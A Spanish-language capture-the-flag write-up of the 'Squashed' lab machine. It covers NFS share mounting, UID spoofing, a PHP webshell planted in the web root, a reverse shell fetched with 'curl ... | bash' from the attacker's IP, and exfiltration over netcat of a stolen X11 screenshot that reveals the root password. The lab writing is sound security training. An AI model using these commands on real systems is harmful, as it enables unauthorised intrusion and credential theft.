**Iniciamos con el escaneo de nmap**

```
nmap -p- --open --min-rate 5000 -vvv -n -sS -Pn -oG allPorts 10.10.11.191
```

![escaneo nmap](/portfolio/blog/writeups/squashed/img/image.png)
**Detectamos los servicios y sus versiones corriendo en cada uno de los puertos**

```
nmap -p 22,80,111,2049,41627,42109,42731,58129 -sCV 10.10.11.191 -oN targeted
```

![escaneo nmap 2](/portfolio/blog/writeups/squashed/img/nmap.png)
**Vemos que tiene el puerto 80 (http) así que usamos la herramienta whatweb para ver que tecnologias está usando**

```
whatweb 10.10.11.191
```

![herramienta what web](/portfolio/blog/writeups/squashed/img/whatweb.png)

**Le damos un vistazo a la web desde el navegador**

![imagen de la web](/portfolio/blog/writeups/squashed/img/web.png)

**Despues de inspeccionar el sitio y enumerar posibles directorios ocultos , no logré encontrar nada , así que ahora toca enumerar más puertos a ver si encontramos el vector de ataque**

**Recordemos que la maquina tiene el puerto 2049 abierto y que corre el servicio NFS el cual puede ser interesante de enumerar**

![Puerto NFS](/portfolio/blog/writeups/squashed/img/puerto%20nfs.png)

**Ejecutamos el siguiente comando para poder ver que recursos de la maquina victima podemos montar en nuestra maquina atacante**

```
showmount -e 10.10.11.191
```

![Montura](/portfolio/blog/writeups/squashed/img/showmount.png)

**El comando nos revela dos recursos que pueden ser motados en nuestro equipo**

**Usamos el comando 'mount' para obtener el contenido de los recursos compartidos**

```
mount -t nfs 10.10.11.191:/home/ross ross
mount -t nfs 10.10.11.191:/var/www/html html
```

**Listamos el contenido**

![listar contenido](/portfolio/blog/writeups/squashed/img/tree.png)

**Vemos que hay un archivo de keepass llamado 'Passwords.kdbx'**

**Y a la carpeta HTML no se puede acceder debido a que su propietario es el usuario
2017**

![Sin permisos](/portfolio/blog/writeups/squashed/img/owner.png)

**Por tanto debemos crear un usario X en nuestra maquina para despues modificar sus atributos y que este se convierta en el usuario 2017**

```
useradd temporal
usermod -u 2017 temporal
passwd temporal
```

![creacion de usuarios](/portfolio/blog/writeups/squashed/img/useradd.png)

**Cambiamos la password de nuestra cuenta creada y ahora si , iniciamos sesión con ella**

```
su temporal
```

![Iniciar sesion](/portfolio/blog/writeups/squashed/img/login.png)

**Escribimos el comando bash para iniciar una consola**

![Comando bash](/portfolio/blog/writeups/squashed/img/bash.png)

**Despues de dar un vistazo al conntenido de la web podemos observar que tenemos sincronizado en nuestro equipo el contenido de la web**

![Web server](/portfolio/blog/writeups/squashed/img/webserver.png)

**para comprobarlo hacemos la siguiente prueba**

```
echo "<h1>Esto es una prueba</h1>" > test.php
```

![Test server](/portfolio/blog/writeups/squashed/img/testserver.png)

**Al comprobarlo , ya sabemos lo que sigue , webshell para ejecutar comandos de forma remota**

```
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

**Solo le tenemos que pasar el comando a ejecuar como parametro cmd en la url**

![Comando en URL](/portfolio/blog/writeups/squashed/img/cmdurl.png)

**Ahora levantamos un servidor en python para compartir el comando que queremos que se ejecute en la maquina para ganar acceso a esta**

![Scripts](/portfolio/blog/writeups/squashed/img/script.png)

**Nos ponemos en escucha por netcat por el puerto 443**

![Netcat](/portfolio/blog/writeups/squashed/img/netcat.png)

**Iniciamos el server en python**

```
python3 -m http.server
```

**A continuacion accederemos a la url:**

```
http://10.10.11.191/webshell.php?cmd=curl http://10.10.14.20:8000/revshell | bash
```

**Ahi recibimos la peticion a nuestro servidor http**

![Peticion http](/portfolio/blog/writeups/squashed/img/peticion.png)

**Se ejecutaria nuestro script y automaticamente recibiremos la reverse shell , ganando acceso al sistema**

![Reverse shell](/portfolio/blog/writeups/squashed/img/revshell.png)

**El siguiente paso es darle tratamiento a la tty**

```
script /dev/null -c bash
ctrl Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

**Podemos acceder a la flag de usuario ubicada en la siguiente ruta**

![flag user](/portfolio/blog/writeups/squashed/img/flag1.png)

**Con el comando w podemos obsoervar que usuarios están activos actualmente en la maquina victima:**

![Active users](/portfolio/blog/writeups/squashed/img/activeusers.png)

**Para la escalada de privilegios abusaremos del archivo .xAuthority que estaba oculto en la montura que creamos anteriormente en la carpeta ross/**
**Para ello tenemos que hacer la misma tecnica de crear un usuario nuevo y hacer que sea el propietario de dicho archivo**

```
usermod -u 1001 temporal
```

**nos compartimos el archivo .Xauthority**

![.Xauthority file](/portfolio/blog/writeups/squashed/img/authority.png)

**Con el siguiente comando podemos hacer una captura de pantalla del usuario ross**

```
xwd -root -silent -out screen.xwd
```

**La pasamos a nuestra maquina atacante**

nc -lvnp 666 > screenshot.xwd <- atacante

nc 10.10.14.20 666 < screen.xwd <- vicitma

convert screenshot.xwd screenshot.png

**Vemos que Ross tiene abierto el programa keepass y pudimos obtener la contraseña de root**

![Kepass](/portfolio/blog/writeups/squashed/img/kepass.png)

**Iniciamos sesion como root con dicha contraseña y obtenemos la flag**

![Root login](/portfolio/blog/writeups/squashed/img/root.png)

**Hemos comprometido la maquina**
